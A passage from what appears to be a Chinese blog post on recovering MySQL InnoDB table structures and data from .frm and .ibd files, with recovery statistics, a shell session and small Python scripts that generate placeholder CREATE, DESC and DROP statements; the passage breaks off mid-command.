<td>偷梁换柱</td>
</tr>
<tr>
<td>3.3</td>
<td>配置文件添加强制恢复innodb的参数；启动服务</td>
<td>蒙蔽她的双眼</td>
</tr>
<tr>
<td>3.4</td>
<td>查看表结构</td>
<td>数据库会拿着新的身份证和面前的人（frm文件）做对比</td>
</tr>
<tr>
<td>3.5</td>
<td>成功获取表结构</td>
<td>数据库发现身份证上信息和被检查的人信息一致，名字，胳膊的数量，对上了就认可啦！（数据库只检查表名和列的个数）</td>
</tr>
<tr>
<td>4</td>
<td><strong>强制恢复表数据</strong></td>
<td></td>
</tr>
<tr>
<td>4.1</td>
<td>丢弃当前表的数据</td>
<td>把这个人的五脏六腑都挖出来</td>
</tr>
<tr>
<td>4.2</td>
<td>将备份的ibd放到对应路径</td>
<td>将之前备份的吃了肉的五脏六腑放进去</td>
</tr>
<tr>
<td>4.3</td>
<td>导入新的数据，如果数据库加载成功则可以看到数据；否则加载失败。</td>
<td>跟大脑汇报一下新的五脏六腑已经就位可以开始使用了；如果使用得没问题就成功；如果器官已经损坏那么手术失败。</td>
</tr>
</tbody></table>
<h2 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h2><h3 id="数据量"><a href="#数据量" class="headerlink" title="数据量"></a>数据量</h3><table>
<thead>
<tr>
<th>明细</th>
<th>大小</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>物理文件</td>
<td>174M</td>
<td></td>
</tr>
<tr>
<td>数据库</td>
<td>1个</td>
<td>cy</td>
</tr>
<tr>
<td>表</td>
<td>57张</td>
<td></td>
</tr>
</tbody></table>
<h3 id="恢复结果"><a href="#恢复结果" class="headerlink" title="恢复结果"></a>恢复结果</h3><blockquote>
<p>在客户服务器上面结果如下：</p>
</blockquote>
<table>
<thead>
<tr>
<th>明细</th>
<th>成功</th>
<th>失败</th>
<th>恢复率</th>
</tr>
</thead>
<tbody><tr>
<td>表结构</td>
<td>58</td>
<td>0</td>
<td>100%</td>
</tr>
<tr>
<td>表数据</td>
<td>56</td>
<td>2</td>
<td>96%</td>
</tr>
</tbody></table>
<blockquote>
<p>在我的服务器上面结果如下：</p>
</blockquote>
<table>
<thead>
<tr>
<th>明细</th>
<th>成功</th>
<th>失败</th>
<th>恢复率</th>
</tr>
</thead>
<tbody><tr>
<td>表结构</td>
<td>58</td>
<td>0</td>
<td>100%</td>
</tr>
<tr>
<td>表数据</td>
<td>58</td>
<td>0</td>
<td>100%</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@toberoot mysql]# /alidata/mysql/bin/mysqld --initialize-insecure --datadir=/alidata/mysql/data/  --user=mysql</span><br><span class="line">[root@toberoot mysql]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot mysql]# mysql -V</span><br><span class="line">mysql  Ver 14.14 Distrib 5.7.17, for linux-glibc2.5 (x86_64) using  EditLine wrapper</span><br><span class="line"></span><br><span class="line">[root@toberoot mysql]# cd ~/home/cy02/</span><br><span class="line">[root@toberoot cy02]# ll</span><br><span class="line">total 178140</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9022 Aug 14  2017 base_dict.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 14 15:00 base_dict.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8822 Mar  2 11:14 biz_advise.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 14:39 biz_advise.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8850 Mar  2 11:14 biz_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar  2 11:14 biz_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9580 Mar  2 11:14 biz.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9286 Mar  2 11:14 biz_gift.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Apr 24 14:08 biz_gift.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8890 Mar  2 11:14 biz_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8745 Mar  2 11:14 biz_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:40 biz_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   180224 May 15 09:42 biz_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:33 biz.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 biz_msg_template.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_msg_template.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8881 Aug 14  2017 biz_take_bank.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 13 19:26 biz_take_bank.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9411 Nov 24 13:22 biz_take.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 15:22 biz_take.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8862 Aug 14  2017 biz_take_wwlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 15:22 biz_take_wwlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8854 Aug 14  2017 biz_take_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 11:52 biz_take_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8925 Aug 14  2017 biz_vip.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Mar 16 09:31 biz_vip.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8852 Aug 14  2017 biz_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:30 biz_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 biz_wx_focus.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx_focus.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9339 Nov 24 13:25 biz_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 10 16:24 biz_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8874 Aug 14  2017 biz_wx_walt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 biz_wx_walt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 cfg_area.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   311296 Aug 14  2017 cfg_area.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8721 Aug 14  2017 cfg_id_gen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 18:41 cfg_id_gen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql       61 Aug 14  2017 db.opt</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9053 Aug 14  2017 gprs_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 18:47 gprs_model.ibd</span><br><span class="line">-r--r--r-- 1 mysql mysql 79691776 May 16 14:04 ibdata1</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Dec 19 15:00 mbr_coin_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2097152 May 15 17:27 mbr_coin_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8766 Dec 19 14:53 mbr_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 19:12 mbr_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9155 May 14 11:55 mbr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   212992 May 15 20:58 mbr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 mbr_oauth.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 19:37 mbr_oauth.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9011 Aug 14  2017 mbr_pay.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_pay.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8740 Aug 14  2017 mbr_prizen.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 mbr_prizen.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9147 Dec 19 14:56 mbr_recharge.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   294912 May 15 19:11 mbr_recharge.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8801 Aug 14  2017 mbr_wallet_chged.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 mbr_wallet_chged.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8845 Aug 14  2017 mbr_wallet.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   262144 May 15 19:12 mbr_wallet.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    10100 Dec 19 15:47 ord.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 31457280 May 15 18:41 ord.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8940 Aug 14  2017 ord_item.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_item.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8917 Aug 14  2017 ord_pay_ali.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_ali.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8924 Dec 19 15:55 ord_pay_coin.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   475136 May 15 17:27 ord_pay_coin.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8926 Aug 14  2017 ord_pay_return.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 ord_pay_return.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8966 Dec 20 16:50 ord_pay_wlt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 17:27 ord_pay_wlt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9036 Aug 14  2017 ord_pay_wx.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql 32505856 May 15 18:41 ord_pay_wx.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9098 Aug 14  2017 prod_base_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_base_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8790 Aug 14  2017 prod_bug_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_bug_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8887 Aug 14  2017 prod_cmd.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8984 Aug 14  2017 prod_cmd_invoke.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_cmd_invoke.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9058 Aug 14  2017 prod_coin_rpt.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9437184 May 15 14:24 prod_coin_rpt.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8798 Aug 14  2017 prod_coin_rpt_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 15 14:24 prod_coin_rpt_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9834 Dec 13 14:12 prod.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8835 Aug 14  2017 prod_gprs_bind.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8793 Aug 14  2017 prod_gprs_bind_his.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   196608 May 15 09:42 prod_gprs_bind_his.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_gprs_bind.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   425984 May 15 09:42 prod.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8851 Aug 14  2017 prod_instl_imgs.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_instl_imgs.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9388 Dec 13 14:13 prod_instl_pos.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   147456 May 15 16:25 prod_instl_pos.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9384 Dec 13 14:14 prod_instl_pos_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   131072 May 15 16:24 prod_instl_pos_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8892 Aug 14  2017 prod_mod_attr.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8873 Aug 14  2017 prod_mod_attr_val.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_attr_val.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9642 Dec 13 14:11 prod_model.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 11 11:58 prod_model.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8815 Aug 14  2017 prod_mod_sku.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_mod_sku.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9050 Aug 14  2017 prod_onl_log.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   163840 May 15 18:42 prod_onl_log.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9143 Aug 14  2017 prod_sp_args.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_args.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8876 Aug 14  2017 prod_sp_arg_vals.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 prod_sp_arg_vals.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9190 Dec 13 14:14 sys_acct.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 May 14 11:16 sys_acct.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     8776 Aug 14  2017 sys_acct_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql   229376 May 11 11:52 sys_acct_res.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql     9106 Aug 14  2017 sys_res.frm</span><br><span class="line">-rw-r--r-- 1 mysql mysql    98304 Aug 14  2017 sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash">获取待恢复表名</span></span><br><span class="line">[root@toberoot cy02]# ll *.frm |awk '&#123;print $9&#125;'|awk -F '.' '&#123;print $1&#125;' &gt; /alidata/cy_table.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> python脚本自动生成建表语句</span></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python /alidata/py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql1.sql </span><br><span class="line">create table base_dict</span><br><span class="line"> (id int);create table biz_advise</span><br><span class="line"> (id int);create table biz_bank</span><br><span class="line"> (id int);create table biz</span><br><span class="line"> (id int);create table biz_gift</span><br><span class="line"> (id int);create table biz_gprs_bind</span><br><span class="line"> (id int);create table biz_gprs_bind_his</span><br><span class="line"> (id int);create table biz_msg_template</span><br><span class="line"> (id int);create table biz_take_bank</span><br><span class="line"> (id int);create table biz_take</span><br><span class="line">省略。。。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入测试表结构</span></span><br><span class="line">[root@toberoot alidata]# mysql -e "show databases"</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">[root@toberoot alidata]# mysql -e "create database cy;"</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; /alidata/cy_sql1.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e "desc cy.sys_res"</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| Field | Type    | Null | Key | Default | Extra |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11) | YES  |     | NULL    |       |</span><br><span class="line">+-------+---------+------+-----+---------+-------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始获取表结构中列的信息</span></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# yes|cp ~/home/cy02/*.frm /alidata/mysql/data/cy/</span><br><span class="line">cp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_advise.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gift.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_msg_template.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wwlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_vip.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_focus.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_walt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_area.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_id_gen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/gprs_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_oauth.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_pay.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_prizen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_recharge.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_item.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_ali.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_return.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_base_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_bug_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd_invoke.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_imgs.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr_val.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_sku.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_onl_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_arg_vals.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct_res.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_res.frm’? [root@toberoot alidata]# </span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cat py_createtable01.py </span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding : utf8 -*-</span></span><br><span class="line"></span><br><span class="line">def create_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line">   </span><br><span class="line">def desc_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "desc &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    #create_table_test('/alidata/cy_table.txt','/alidata/cy_sql1.sql')</span><br><span class="line">    desc_table_test('/alidata/cy_table.txt','/alidata/cy_sql2.sql')</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py</span><br><span class="line">[root@toberoot alidata]# head cy_sql2.sql </span><br><span class="line">desc base_dict</span><br><span class="line">;desc biz_advise</span><br><span class="line">;desc biz_bank</span><br><span class="line">;desc biz</span><br><span class="line">;desc biz_gift</span><br><span class="line">;desc biz_gprs_bind</span><br><span class="line">;desc biz_gprs_bind_his</span><br><span class="line">;desc biz_msg_template</span><br><span class="line">;desc biz_take_bank</span><br><span class="line">;desc biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 截取包含列名的报错</span></span><br><span class="line">[root@toberoot alidata]# grep contains  mysql/dataerror.log &gt; cy_error1.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 报错格式如下：</span></span><br><span class="line">2018-05-17T07:58:32.926555Z 3 [Warning] InnoDB: Table cy/base_dict contains 1 user defined columns in InnoDB, but 11 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.555492Z 4 [Warning] InnoDB: Table cy/biz_advise contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line">2018-05-17T07:59:03.556045Z 4 [Warning] InnoDB: Table cy/biz_bank contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将表名和列数存放至文件中</span></span><br><span class="line">[root@toberoot alidata]# awk '&#123;print $6,$15&#125;' cy_error1.log | awk -F '/' '&#123;print $2&#125;' &gt; cy_table_col.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 根据以上表名和列数生成新的测试表</span></span><br><span class="line">def create_table_col(table_col_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_col_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    # b_list = ['t1 10','t2 20']</span><br><span class="line">    str_list = []</span><br><span class="line">    for table_col_str in b_list:</span><br><span class="line">        table_col_list = table_col_str.split()</span><br><span class="line">	table = table_col_list[0]</span><br><span class="line">	col = int(table_col_list[1])</span><br><span class="line">        string = "create table &#123;&#125; (".format(table)</span><br><span class="line">        str_list.append(string)</span><br><span class="line">	for i in range(1,col+1):</span><br><span class="line">            if i!=col:</span><br><span class="line">                string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">	    else:</span><br><span class="line">                string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">    for line in str_list:</span><br><span class="line">        a_file.write(line)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">create_table_col('/alidata/cy_table_col.txt','/alidata/cy_sql3.sql')</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除这些测试表</span></span><br><span class="line">[root@toberoot alidata]# vim py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 60</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 12:12 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 15:44 mysql</span><br><span class="line">-rw-r--r--  1 root  root   1798 May 17 16:17 py_createtable01.py</span><br><span class="line"><span class="meta">#</span><span class="bash">python代码如下：</span></span><br><span class="line">def drop_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">drop_table_test('/alidata/cy_table.txt','/alidata/cy_sql4.sql')</span><br><span class="line">    </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql4.sql </span><br><span class="line">drop table base_dict</span><br><span class="line">;drop table biz_advise</span><br><span class="line">;drop table biz_bank</span><br><span class="line">;drop table biz</span><br><span class="line">;drop table biz_gift</span><br><span class="line">;drop table biz_gprs_bind</span><br><span class="line">;drop table biz_gprs_bind_his</span><br><span class="line">;drop table biz_msg_template</span><br><span class="line">;drop table biz_take_bank</span><br><span class="line">;drop table biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除数据库的时候直接卡死了，原因未知。也没有报错。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">清数据启动服务</span></span><br><span class="line"></span><br><span class="line">ln: failed to create symbolic link ‘/usr/local/mysql/bin/mysqld’: File exists</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot ~]# mysql -e 'create database cy'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始尝试获取表的结构</span></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql3.sql</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">cp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? ^C</span><br><span class="line">[root@toberoot alidata]# yes | cp 